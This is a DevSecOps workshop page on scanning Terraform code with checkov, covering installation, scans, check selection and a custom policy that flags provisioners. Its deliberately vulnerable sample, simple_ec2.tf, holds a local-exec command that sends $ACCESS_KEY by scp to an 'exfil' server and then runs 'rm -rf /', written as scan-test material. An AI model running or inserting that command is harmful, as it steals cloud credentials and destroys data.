---
title : "Code Scanning with checkov"
date :  "`r Sys.Date()`" 
weight : 3
chapter : false
pre : " <b> 2.3 </b> "
---

**Install checkov**

To get started, install checkov using pip:

```sh
pip3 install checkov
```

![23][1]

Use the **--version** and **--help** flags to verify the install and view usage / optional arguements

```sh
checkov --version
checkov --help
```
![23][2]

To see a list of every policy that Checkov can enforce, use the -l or --list options.

```sh
checkov --list
```
![23][3]

Now that you see what checkov can do, let's get some code to scan...


**Fork and clone target repository**

This workshop involves code that is vulnerable-by-design. All of the necessary code is contained within [this repository](https://github.com/paloAltoNetworks/prisma-cloud-devsecops-workshop)  or workshop guide itself.

To begin, log into Github and navigate to the [Prisma Cloud DevSecOps Workshop](https://github.com/paloAltoNetworks/prisma-cloud-devsecops-workshop)  repository. Create a `Fork` of this repositry to create a copy of the code in your own account  ![23][4]

Ensure the selected `Owner` matches your username, then proceed to fork the repository by clicking `Create fork.` ![23][5]

Grab the repo URL from Github, then clone the `forked` repository to Cloud9. ![23][6]

```sh
git clone https://github.com/nonotnonez/prisma-cloud-devsecops-workshop.git
cd prisma-cloud-devsecops-workshop/
git status
```
![23][7]

Great! Now we have some code to scan. Let's jump in...

**Scan with checkov**

Checkov can be configured to scan files and enforce policies in many different ways. To highlight a few:

1. Scans can run on individual files or entire directories.
2. Policies can be selected through selection or omission.
3. Enforcement can be determined by flags that control checkov's exit code.

Let's start by scanning the entire `./code `directory and viewing the results.

```sh
cd code/
checkov -d .
```

![23][8]

Failed checks are returned containing the offending file and resource, the lines of code that triggered the policy, and a guide to fix the issue.

![23][9]

Now try running checkov on an individual file with checkov -f <filename>.

```sh
checkov -f deployment_ec2.tf
```
```sh
checkov -f simple_ec2.tf
```
{{%expand "Expand simple_ec2.tf" %}}
```sh
provider "aws" {
  region = "us-west-2"
}

resource "aws_ec2_host" "test" {
  instance_type     = "t3.micro"
  availability_zone = "us-west-2a"

  provisioner "local-exec" {
    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
  }

}
```
{{% /expand%}}

![23][10]

Policies can be optionally enforced or skipped with the --check and --skip-check flags.

```sh
checkov -f deployment_s3.tf --check CKV_AWS_18,CKV_AWS_52
```
```sh
checkov -f deployment_s3.tf --skip-check CKV_AWS_18,CKV_AWS_52
```

Frameworks can also be selected or omitted for a particular scan:

```sh
checkov -d . --framework secrets --enable-secret-scan-all-files
```

```sh
checkov -d . --skip-framework dockerfile
```

Lastly, enforcement can be more granularly controlled by using the `--soft-fail` option. Applying `--soft-fail` results in the scan always returning a 0 exit code. Using `--hard-fail-on `overrides this option.

Check the exit code when running checkov -d . with and without the --soft-fail option.

```sh
checkov -d . ; echo $?
```
```sh
checkov -d . --soft-fail ; echo $?
```

An example of using `--soft-fail` and exit codes in a pipeline context will be demosntrated in a later section.

**Custom Policies**

Checkov supports the creation of [Custom Policies](https://www.checkov.io/3.Custom%20Policies/YAML%20Custom%20Policies.html)  for users to customize their own policy and configuration checks. Custom policies can be written in YAML (recommended) or python and applied with the --external-checks-dir or --external-checks-git flags.

Let's create a custom policy to check for [local-exec and remote-exec Provisioners](https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec)  being used in Terraform resource definitons. (Follow link to learn more about provisioners and why it is a good idea to check for them).

```sh
metadata:
 name: "Terraform contains local-exec and/or remote-exec provisioner"
 id: "CKV2_TF_1"
 category: "GENERAL_SECURITY"
definition:
 and:
  - cond_type: "attribute"
    resource_types: all
    attribute: "provisioner/local-exec"
    operator: "not_exists"
  - cond_type: "attribute"
    resource_types: all
    attribute: "provisioner/remote-exec"
    operator: "not_exists"

```

Add the above code to a new file within a new direcotry.

```sh
mkdir custom-checks/
vim custom-checks/check.yaml
```

Save the file. Then run checkov with the --external-checks-dir to test the custom policy.

```sh
checkov -f simple_ec2.tf --external-checks-dir custom-checks
```

![23][11]

**IDE plugin**

Requires API key for Prisma Cloud.

Follow links: https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/3-section1/4-ide-plugin


[1]: /ws02/images/2/23/1.png?featherlight=false&width=50pc
[2]: /ws02/images/2/23/2.png?featherlight=false&width=50pc
[3]: /ws02/images/2/23/3.png?featherlight=false&width=50pc
[4]: /ws02/images/2/23/4.png?featherlight=false&width=50pc
[5]: /ws02/images/2/23/5.png?featherlight=false&width=50pc
[6]: /ws02/images/2/23/6.png?featherlight=false&width=50pc
[7]: /ws02/images/2/23/7.png?featherlight=false&width=50pc
[8]: /ws02/images/2/23/8.png?featherlight=false&width=50pc
[9]: /ws02/images/2/23/9.png?featherlight=false&width=50pc
[10]: /ws02/images/2/23/10.png?featherlight=false&width=50pc
[11]: /ws02/images/2/23/11.png?featherlight=false&width=50pc